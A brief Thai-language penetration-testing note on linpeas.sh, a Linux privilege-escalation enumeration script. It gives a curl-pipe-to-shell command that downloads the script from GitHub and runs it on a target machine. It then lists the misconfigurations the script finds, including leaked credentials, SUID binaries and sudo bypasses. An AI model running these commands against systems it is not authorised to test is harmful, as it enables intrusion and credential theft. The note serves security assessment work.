#privesc 
# What
สคริปต์ Bash สำหรับ “กวาดหาแนวทางยกระดับสิทธิ์” บนลินุกซ์แบบอัตโนมัติ ผลลัพธ์แสดงเป็นสี แยกหมวด misconfig ที่น่าจะนำไปสู่ privesc **รันบนเครื่องเป้าหมาย**
# Run
```bash
# วิธีที่นิยมสุด (ดาวน์โหลดเวอร์ชันล่าสุดแล้วรันทันที)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# หรือโหลดไว้ก่อนแล้วค่อยรัน
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
```
# Detect
- ข้อมูลระบบ/เคอร์เนล/แพตช์
- สิทธิ์ sudo -l, บายพาสผ่านไบนารีตาม GTFOBins
- ไฟล์/ไดเรกทอรีที่เขียนได้ผิดปกติ, SUID/SGID, Capabilities
- Cron/Timer/Service ที่เรียกสคริปต์แก้ไขได้
- คีย์/พาสเวิร์ดที่อาจรั่วในไฟล์คอนฟิก/ฮิสทอรี
- การตั้งค่า PATH/LD_PRELOAD ที่นำไปสู่ Hijacking ผลจะไฮไลต์ด้วยสี ช่วยให้เห็น “quick wins” ง่ายขึ้น